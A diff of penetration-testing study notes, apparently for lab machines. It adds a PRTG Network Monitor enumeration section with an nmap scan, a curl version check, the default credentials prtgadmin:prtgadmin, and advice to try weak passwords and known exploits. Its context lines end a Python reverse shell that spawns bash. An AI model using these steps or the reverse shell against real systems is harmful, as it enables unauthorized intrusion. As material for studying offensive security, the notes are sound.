@@ -619,3 +619,19 @@ s.connect((ip,int(port)))
 pty.spawn('/bin/bash')
 ```
 
+## PRTG Network Monitor
+
+### Discovery/Footprinting/Enumeration
+
+- An nmap scan can reveal PRTG, usually on common web ports (80, 443, 8080)
+```bash
+sudo nmap -sV -p- --open -T4 10.129.176.144
+```
+- Can show up in Eyewitness scan
+- These scans can reveal version number (which can be searched for exploits) or use curl
+```bash
+curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
+```
+- Default creds ```prtgadmin:prtgadmin```
+- Try weak passwords for ```prtgadmin```
+- Try know exploits for version
